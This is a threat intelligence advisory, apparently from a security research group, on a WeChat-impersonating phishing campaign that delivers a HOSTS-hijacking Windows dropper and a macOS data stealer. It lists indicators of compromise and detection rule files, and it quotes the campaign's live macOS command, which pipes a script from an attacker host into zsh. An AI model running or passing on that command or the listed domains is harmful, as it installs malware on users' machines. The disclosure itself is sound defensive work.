# WeChat-Impersonating Cross-Platform Stealer (HOSTS Hijack)

**Date:** 2026-06-26  
**Classification:** TLP:WHITE - Share freely  
**Author:** Sentry North Security Research  
**Source:** https://github.com/SentryNorth/WeChat-Impersonating-Cross-Platform-Stealer  

---

## Summary

A targeted phishing campaign impersonating WeChat was identified and fully analyzed. The attack uses punycode domain cloaking, OS-aware payload delivery, and a multi-stage Windows malware chain culminating in HOSTS file hijacking (Hijack.Host) and endpoint protection disruption.

- **VirusTotal file scan:** 0/70 (completely clean by all static analysis engines)
- **VirusTotal URL scan (C2):** 2/32 (Forcepoint ThreatSeeker, SOCRadar flagged)
- **VirusTotal domain scan (punycode):** 0/91

The campaign was **completely undocumented in public threat intelligence** at the time of analysis.

---

## IOCs

Raw IOCs are provided in multiple formats:

- `ioc_stix.json` — STIX 2.1 threat intelligence bundle
- `ioc_misp.json` — MISP event format

### Key Indicators

| Type | Value | Description |
|------|-------|-------------|
| Punycode Domain | `xn--wechat-u88im840c.com` | WeChat impersonation phishing domain |
| C2 Domain | `charlestonwaterheater.com` | Command & control server |
| Payload Host | `wechat.appstore.ms` | Multi-platform payload delivery |
| Phishing URL | `https://xn--wechat-u88im840c.com/calls/663553598529` | Original lure |
| Windows Installer | `WeChat_Setup.exe` (101MB) | NSIS+Electron dropper |
| **Dropper Hash** | `150f9d3297adac81aaa042fc585732e1229d15d7021532100b8563571642fae3` | SHA256 of WeChat_Setup.exe ([VirusTotal](https://www.virustotal.com/gui/file/150f9d3297adac81aaa042fc585732e1229d15d7021532100b8563571642fae3)) |

### Verified Anti-Analysis Entry

```
127.0.0.1 www.virustotal.com
```

This entry was confirmed in the quarantined HOSTS file and is specifically designed to prevent victims from re-scanning the malware on VirusTotal.

---

## Detection Rules

Detection rules are provided in `detection/`:

- `snort/wechat_stealer.rules` — Snort/Suricata network alerts
- `yara/wechat_stealer.yar` — YARA rules (macOS loader + Windows installer)
- `sigma/hijack_host.yml` — Sigma rule for HOSTS file replacement

---

## Technical Analysis

### Attack Chain Summary

**Stage 0 — Social Engineering:** Telegram DM from fake "Bankless" recruiter with a fake job opportunity. Lure: "Oscar Hansen | Bankless invites you to join the call!"

**Stage 1 — Punycode Cloaking:** `wechat\u4f1a\u9762.com` (Chinese for "meeting") encoded as `xn--wechat-u88im840c.com` — visually indistinguishable from a legitimate WeChat domain.

**Stage 2 — OS-Aware Delivery:**
- macOS: `curl -kfsSL https://wechat.appstore.ms/macos/installation | zsh`
- Windows: `WeChat_Setup.exe` (101MB NSIS+Electron dropper)

**Stage 3 — Windows Execution:**
- Fake "Mozilla Firefox is updating" decoy window appears
- Malwarebytes real-time protection provides **zero detection** during execution
- Malwarebytes processes are **neutralized** (active anti-AV process interference)
- HOSTS file replaced with 1728 bytes of redirects (40-50 entries)
- Confirmed anti-analysis entry: `127.0.0.1 www.virustotal.com`

**Stage 4 — macOS Payload (Decoded):** zsh daemon detaches -> C2 AppleScript collects system data -> chunked HTTP PUT upload (10MB chunks) to `/gate` -> self-deleting zip cleanup.

### Binary Analysis

- **File:** `WeChat_Setup.exe` (101MB, 106,534,224 bytes)
- **Type:** PE32 executable, NSIS 5.9.1 installer
- **Payload:** Electron app (React 18 + Tailwind + Electron-toolkit v5.9.12.57810)
- **Verification:** 1,940 ASAR archive files extracted and analyzed — **no malicious JS calls** (no exec/spawn/writeFile/child_process)
- **Conclusion:** The Electron app is a **social engineering decoy** that displays a fake WeChat UI while the actual malicious payload (Hijack.Host / HOSTS replacement) runs independently via the NSIS installer logic

### C2 Infrastructure

- **C2 Domain:** `charlestonwaterheater.com` (Cloudflare-fronted, Unstoppable Domains registrar)
- **Phishing Domain:** `xn--wechat-u88im840c.com` (Tucows registrar, Cloudflare-fronted)
- **Payload Host:** `wechat.appstore.ms`
- **Cloudflare IPs:** `104.21.85.232`, `172.67.211.228`

### Malwarebytes Baseline Comparison

Installed as a real-time detection baseline in the analysis environment:
- **Execution:** 0 detection, 0 alerts, 0 prevention
- **Post-deployment scan:** Found only Hijack.Host (HOSTS file replacement) — 1 artifact out of a multi-stage chain
- **Anti-AV observation:** Two-phase neutralization — active process interference during execution + persistent DNS blocking via HOSTS hijack after deployment

### MITRE ATT&CK Mapping (16 Techniques)

Mapped across Reconnaissance, Phishing, Masquerading, System Configuration, Hosts File Modification, Impair Defenses, Abuse Elevation Control, Create/Modify System Process, Obfuscated Files, Input Capture, and Exfiltration Over C2. Full technique IDs and platform breakdowns available in the IOC data.

---

## About Sentry North

Sentry North is an autonomous blue-team cybersecurity agent that monitors computer networks for attacks, detects threats using network traffic analysis and system logs, and automatically investigates and blocks suspicious activity.

This report was produced by the Sentry North autonomous analysis pipeline, which consists of:
- **Acquisition containers** (Docker personas for obtaining samples from active campaigns)
- **Analysis VMs** (controlled environments with comparative commercial AV baselines)
- **Sentry North agent** (autonomous investigation and documentation)

Over multiple structured adversarial sessions against a professional red team, Sentry North improved from catching 10% of attacks to catching 100%, with detection times under one second and zero false positives.

**Contact:**  sentry.north@proton.me
**License:** Creative Commons Attribution 4.0 (CC BY 4.0). Attribution required.

---

*This repository was created to provide the security community with actionable IOCs and detection rules.*
